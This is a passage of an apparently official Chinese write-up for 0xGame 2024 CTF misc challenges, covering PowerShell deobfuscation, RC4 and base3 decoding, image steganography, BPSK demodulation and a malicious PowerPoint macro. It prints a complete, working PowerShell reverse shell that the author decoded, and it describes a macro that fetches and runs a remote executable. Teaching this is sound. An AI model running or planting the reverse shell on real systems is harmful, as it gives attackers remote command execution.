class="variable">$SsuhfRO1wgyokMOlaEmBBcAzcInXG54WdHo9eVpNI9Xhb0kluCXXz5hxYS7pzUgJOfnpV8ZkPMhHNCtTMkSg1Sj32zonCoq4qXXfBsmASttQtGic0mBErHBYS6ROmJohHmnHTYa2ijVwYv8vfzgFLW6rPkY1LpsEVrbfCqc6QFCdo3mzQIkyU1pbPKuH2IDPbkYshWZYoiLxtYBdsGa6ZtvZ8WpbYhmHEcXG4RGhhoLPTnTITmSZJ7rm24GYws75qN4ZOH4Wf9IBSHuRLtOmGVi23anihNphBV8IkTmT6vhChsJwC6HY1zTN4lbA4wmdtEjhSyEF3pY2XLm8RTzIZAkoAiKvzD7V1rLdMa5nUo0c2eDe9wpnJ1qWhOy1GuVYMFI09bVegrdWHlQ4np4GWDAlc8FJhzM6gzRHwbklJmLtPcwm1MFf0vlh9lLqLpMdS586AnnBMuJezW6Tpmta4O5HaDxLsb3S8l3wTxCjoad1BdqAoZa1</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$Cx99zNP0yc8btz1DgdjQ4d6Or1WXvNo8ujcqwFC3kgHFE9zERLRSUflsWbCwFagZeNLAt8td0BUZr85MNnhsIJtjt4781b120rrHzFZmMsUAPcAS4tHCiJx9Vst4SWWeSBn8IkFD6e4O6bMfzboKxPZiplfSpAXYD1iHJbuWsDciLYdqfa9TcbYHOWxeR91cFzmnKRYSFU573fAKQqZMCsiaLB2ZMGMlIbshBlb94PHljepzqNuqEo2uRQ0Pg4hLsKE7D4cXoCXuDAUwHPVQm3Jz6KQcfUWAlvGzhQKyzLBXGta8LH6Ua0yL8nFCPU4O3uIh58sIpSPEdxO4HkYZfKSF9ta6hrN2o8YWfbRMIdMHNNgywFv3YVlCzwKWP3suJq7yHHl0O0MW7dtk2t05bteVH0k4O0HOfKLQ4wDPrnwu5Q1d7L6JLvNEC9dAtXx56ACbzCHQMt8ZIaxZeLxWMnB7Q34pe0bmoO1hPZtiRENA4Scp1Gsm</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># If you don’t believe it, you can try it</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> <span class="variable">$SsuhfRO1wgyokMOlaEmBBcAzcInXG54WdHo9eVpNI9Xhb0kluCXXz5hxYS7pzUgJOfnpV8ZkPMhHNCtTMkSg1Sj32zonCoq4qXXfBsmASttQtGic0mBErHBYS6ROmJohHmnHTYa2ijVwYv8vfzgFLW6rPkY1LpsEVrbfCqc6QFCdo3mzQIkyU1pbPKuH2IDPbkYshWZYoiLxtYBdsGa6ZtvZ8WpbYhmHEcXG4RGhhoLPTnTITmSZJ7rm24GYws75qN4ZOH4Wf9IBSHuRLtOmGVi23anihNphBV8IkTmT6vhChsJwC6HY1zTN4lbA4wmdtEjhSyEF3pY2XLm8RTzIZAkoAiKvzD7V1rLdMa5nUo0c2eDe9wpnJ1qWhOy1GuVYMFI09bVegrdWHlQ4np4GWDAlc8FJhzM6gzRHwbklJmLtPcwm1MFf0vlh9lLqLpMdS586AnnBMuJezW6Tpmta4O5HaDxLsb3S8l3wTxCjoad1BdqAoZa1</span></span><br></pre></td></tr></table></figure><p>主要是将变量名变得复杂一些+base64加密关键代码，最终解完混淆可以发现执行了一个反弹shell的操作：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$LHOST</span> = <span class="string">&quot;192.168.93.132&quot;</span>; <span class="variable">$LPORT</span> = <span class="number">2333</span>; <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="variable">$LHOST</span>, <span class="variable">$LPORT</span>); <span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream(); <span class="variable">$StreamReader</span> = <span class="built_in">New-Object</span> IO.StreamReader(<span class="variable">$NetworkStream</span>); <span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>); <span class="variable">$StreamWriter</span>.AutoFlush = <span class="variable">$true</span>; <span class="variable">$Buffer</span> = <span class="built_in">New-Object</span> System.Byte[] <span class="number">1024</span>; <span class="keyword">while</span> (<span class="variable">$TCPClient</span>.Connected) &#123; <span class="keyword">while</span> (<span class="variable">$NetworkStream</span>.DataAvailable) &#123; <span class="variable">$RawData</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length); <span class="variable">$Code</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$RawData</span> <span class="literal">-1</span>) &#125;; <span class="keyword">if</span> (<span class="variable">$TCPClient</span>.Connected <span class="operator">-and</span> <span class="variable">$Code</span>.Length <span class="operator">-gt</span> <span class="number">1</span>) &#123; <span class="variable">$Output</span> = <span class="keyword">try</span> &#123; <span class="built_in">Invoke-Expression</span> (<span class="variable">$Code</span>) <span class="number">2</span>&gt;&amp;<span class="number">1</span> &#125; <span class="keyword">catch</span> &#123; <span class="variable">$_</span> &#125;; <span class="variable">$StreamWriter</span>.Write(<span class="string">&quot;<span class="variable">$Output</span>`n&quot;</span>); <span class="variable">$Code</span> = <span class="variable">$null</span> &#125; &#125;; <span class="variable">$TCPClient</span>.Close(); <span class="variable">$NetworkStream</span>.Close(); <span class="variable">$StreamReader</span>.Close(); <span class="variable">$StreamWriter</span>.Close()</span><br></pre></td></tr></table></figure><p>之后计算MD5值就能得到flag：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496036760-2b3aad84-9059-4d8d-b90b-abbea4d9957d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="我叫曼波">我叫曼波</h3><p>题目附件给了 <code>encode.py</code>，加密的流程基本都给出了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;0xGame&#123;This_is_a_fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">real_real_real_random</span>():</span><br><span class="line">    random_num = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">plain,K</span>):</span><br><span class="line">    S = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        S[i] = i</span><br><span class="line">        T[i] = K[i % <span class="built_in">len</span>(K)]</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        k = S[t]</span><br><span class="line">        cipher.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (base64.b64encode(<span class="string">&quot;&quot;</span>.join(cipher).encode())).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base3</span>(<span class="params">s</span>):</span><br><span class="line">    base3_s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        dec_value = <span class="built_in">ord</span>(i)</span><br><span class="line">        base3_c = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> dec_value &gt; <span class="number">0</span>:</span><br><span class="line">            base3_c += <span class="built_in">str</span>(dec_value % <span class="number">3</span>)</span><br><span class="line">            dec_value = dec_value // <span class="number">3</span></span><br><span class="line">        base3_c = base3_c[::-<span class="number">1</span>].rjust(<span class="number">5</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        base3_s += base3_c</span><br><span class="line">    <span class="keyword">return</span> (base3_s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manbo_encode</span>(<span class="params">base3_s</span>):</span><br><span class="line">    manbo_dict = &#123;<span class="string">&quot;0&quot;</span>:<span class="string">&quot;曼波&quot;</span>,<span class="string">&quot;1&quot;</span>:<span class="string">&quot;哦耶&quot;</span>,<span class="string">&quot;2&quot;</span>:<span class="string">&quot;哇嗷&quot;</span>&#125;</span><br><span class="line">    manbo_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> base3_s:</span><br><span class="line">        manbo_text += manbo_dict[i]</span><br><span class="line">    <span class="keyword">return</span> manbo_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">i</span>):</span><br><span class="line">    flag_part = flag[i:i+<span class="number">1</span>]</span><br><span class="line">    a = real_real_real_random()</span><br><span class="line">    b = RC4(flag_part,a)</span><br><span class="line">    c = base3(b)</span><br><span class="line">    d = manbo_encode(c)</span><br><span class="line">    <span class="keyword">return</span> a,d  <span class="comment"># key:a  ciphertext:d</span></span><br></pre></td></tr></table></figure><p>分析一下可以知道先生成随机数用作RC4的KEY，再传入flag_part进行RC4加密，之后进行三进制编码，最后自定义了一个曼波编码，于是可以编写<code>decode.py</code>并进行远程交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manbo_decode</span>(<span class="params">d</span>):</span><br><span class="line">    manbo_dict = &#123;<span class="string">&quot;曼波&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;哦耶&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;哇嗷&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(d),<span class="number">2</span>):</span><br><span class="line">        c += manbo_dict[d[i:i+<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base3</span>(<span class="params">c</span>):</span><br><span class="line">    b = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">5</span>):</span><br><span class="line">        b += <span class="built_in">chr</span>(<span class="built_in">int</span>(c[i:i+<span class="number">5</span>],base=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">cipher,K</span>):</span><br><span class="line">    S = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        S[i] = i</span><br><span class="line">        T[i] = K[i % <span class="built_in">len</span>(K)]</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    plain = []</span><br><span class="line">    cipher = base64.b64decode(cipher.encode()).decode()</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        k = S[t]</span><br><span class="line">        plain.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(plain)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    key = p.recvline().decode().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getciphertext</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    ciphertext = p.recvline().decode().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">k,c</span>):</span><br><span class="line">    c2 = manbo_decode(c)</span><br><span class="line">    c3 = base3(c2)</span><br><span class="line">    pf = RC4(c3,k)</span><br><span class="line">    <span class="keyword">return</span> pf</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.98.178.117&quot;</span>,<span class="number">1111</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    generate()</span><br><span class="line">    key = getkey()</span><br><span class="line">    ciphertext = getciphertext()</span><br><span class="line">    part_of_flag = decode(key,ciphertext)</span><br><span class="line">    flag += part_of_flag</span><br><span class="line">    <span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><h3 id="报告哈基米">报告哈基米</h3><p>题目附件只给了一个 <code>mijiha.png</code>，拖入010Editor看一下，一眼就能看见文件尾的逆置字符串，再关注一下chunk块就能发现倒数第二个IDAT块未满的情况下还跟了一个IDAT块，不过其实眼神好一些可以直接注意到上方的<code>txt.ahijim</code>：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496036752-7ea27f23-a417-43f3-b395-08b721a52d6a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>先对文件尾的字符串逆置一下可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Maybe You Need To Know Arnold Cat?</span><br></pre></td></tr></table></figure><p>查阅资料可以知道这是猫映射变换，可以进行逆变换，不过需要知道<code>a,b</code>参数以及<code>shuffle_times</code>置乱次数，经过一些尝试可以发现这些参数通过LSB隐写进图片中了，可以用stegsolve，也可以用zsteg：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496037547-f4c4ceed-b651-4cf6-b0fd-8d21adcbd1c1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>之后编写脚本或者直接在网上找到逆变换脚本即可解出flag前半部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_decode</span>(<span class="params">image,a,b</span>):</span><br><span class="line">    decode_image = Image.new(image.mode, image.size)</span><br><span class="line">    h,w = image.size</span><br><span class="line">    data = image.load()</span><br><span class="line">    ddata = decode_image.load()</span><br><span class="line">    N = h</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            nx = ((a * b + <span class="number">1</span>) * x - b * y) % N</span><br><span class="line">            ny = (y - a * x) % N</span><br><span class="line">            ddata[ny, nx] = data[y, x]</span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;mijiha.png&quot;</span>)</span><br><span class="line">origin_img = arnold_decode(img,<span class="number">35</span>,<span class="number">7</span>)</span><br><span class="line">origin_img.show()</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496037557-5e9b95ad-5e7f-47a1-8fa8-206d5bd7005d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再分析多出来的chunk块，仔细观察可以发现是zip逆置了，提取出来：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496037368-a1815d7c-d52a-44a3-9741-46bc752930db.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>解压得到<code>mijiha.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?reppuT sihT sI</span><br><span class="line">2526565031717334081355849302824518400002066054780560033875031426082285618693525319794798626066006125490363219506086284195590452459190680646206136430850230509326192863922658924373311369100100099532515379974605057083065159988318523088554342510823923801250157027140252790785117812414283997607047894726844336402237327944299070706739459672938738683171995926543691983512367190948019577689694975313311316787244413406201168210658030717811912751907802312004909911805602609847391116950248882484065492329404895296665244558410377999740959307786584149849</span><br></pre></td></tr></table></figure><p>同样将其整段逆置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9489414856877039590479997730148554425666925984049232945604842888420596111937489062065081199094002132087091572191187170308560128611026043144427876131133135794969867759108490917632153891963456295991713868378392769549376070709924497237322046334486274987407067993824142187115870972520417207510521083293280152434558803258138899515603807505064799735152359900010019631133734298562293682916239050320580346316026460860919542540955914826806059123630945216006606268974979135253968165822806241305783300650874506602000048154282039485531804337171305656252</span><br><span class="line">Is This Tupper?</span><br></pre></td></tr></table></figure><p>查找Tupper相关资料，发现有在线工具可以直接解，拿到flag后半部分：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496037419-470a092d-c366-4137-aa75-fe013deb6c5d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>或者在github上也能找到相关项目https://github.com/cariad/tupper：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496037462-21c119ef-a046-4e68-916d-77905048fbfc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="神秘电波">神秘电波*</h3><p>搜索一下grc文件，不难发现这是gnuradio图形化设计文件。下载gnuradio后打开即可看到流程图。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130635605-a295e945-e07f-46e7-9efc-fc44bfc57b36.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>从constellationobject那个模块可以看到，这里是进行了bpsk调制，只不过后面稍微加了一点简单的数学运算。去gnuradio的<ahref="https://wiki.gnuradio.org/index.php?title=Simulation_example:_BPSK_Demodulation">官方文档</a>可以查到bpsk的解调方法。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130635510-905d8f72-ebb2-4582-91f8-6018e9187144.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>但是显然这边还得改改，有几点要注意，首先文档中不是像题目中一样从文件输入的，文档中用的是虚拟源，输出也是虚拟的。另外题目中调制时有polyphaseclocksync这一步，而题目中没有，所以在解调的时候得加上。因此，预期的解调流程图如下：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130635602-71bd6865-9da5-454f-9c25-9de25cb3bc39.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>点击顶上的run，先generate，再execute。这个小窗口刚出来差不多就可以关掉了，以免生成的flag.txt太大。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130635529-f390f874-9f7f-4062-bd1c-9196806f846b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用010editor可以看到，flag.txt是个二进制文件，每个字节不是00就是01。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130635731-01d4bfee-6401-4bea-8a2d-2e55cdee971b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用脚本将00转换成0,01转换成1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0x01</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> i==<span class="number">0x00</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>转换出的二进制丢进cyberchef即可看见flag</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130636752-7821b8ea-6fb7-4cc7-9145-d42f905b8aea.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>由于解调时一些数据的丢失，这里存在一些乱码。题目提示了flag是标准uuid形式，结合前后不难推断出flag：0xGame{38df7992-6c53-11ef-b522-c8348e2c93c6}</p><h3 id="重生之我在南邮当ctf大王">重生之我在南邮当CTF大王</h3><p>硬玩游戏可以拿到flag2,flag3,flag4，不过flag1可能需要按照许愿树的hint去做</p><p>可以在<code>data</code>文件夹中找到各张地图的json数据，一个一个看就会发现所有flag都在里面</p><p>flag1:</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130636833-dcd7f82c-ff56-4b44-9a11-5a839c293098.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130637500-2ff3dd78-ed0e-4886-8fc7-90c5a6ae8eac.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag2:</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130638100-af5d6f20-19f5-4edb-a228-22cb3c5579de.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag3:</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130638134-712c87bb-d7f3-49ca-91b6-8d7fc5eba5f1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag4:</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130638119-019fc670-6063-4f07-9960-0d586c637a4d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>上网找找资料可以知道这是兽音编码后的结果：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130638141-7ce00bf5-e5a8-430a-8c42-b22866fcacbe.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>四段拼起来就是flag</p><h3 id="crazy-thursday-v-me-50-btc">Crazy Thursday v me 50 btc*</h3><p>下载下来的附件中有一个pptm文件，搜索一下可以知道这是一个启用了宏的ppt，查看一下宏代码。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805642487-473cd06e-7f5a-49a1-b100-fcd878c9f25c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>（另外这里还有个小彩蛋，移开第二张ppt里的图片可以看到一行字，不过这与题目无关）</p><figure><imgsrc="https://cdn.nlark.com/yuque/0/2024/png/46824302/1730805642882-7f23840a-dfb2-4223-8c12-8ad7820a1387.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里的逻辑是在播放到第二张ppt的时候就从某个服务器上下载summer.exe并运行。</p><p>访问一下http://47.239.17.55/summer.exe，下载得到summer.exe。</p><p>丢进exeinfope查一下，可以看到这个程序是用python编写的，或者熟悉的可以直接从图标看出来这点。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805643014-9fbb4bd1-6fae-40d5-96ee-c65a18f64a5b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>先用<ahref="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor.py</a>将其拆为pyc文件</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805643061-c6df86d5-1177-4984-bf04-8fbcc76cf402.png"alt="img" /><figcaption 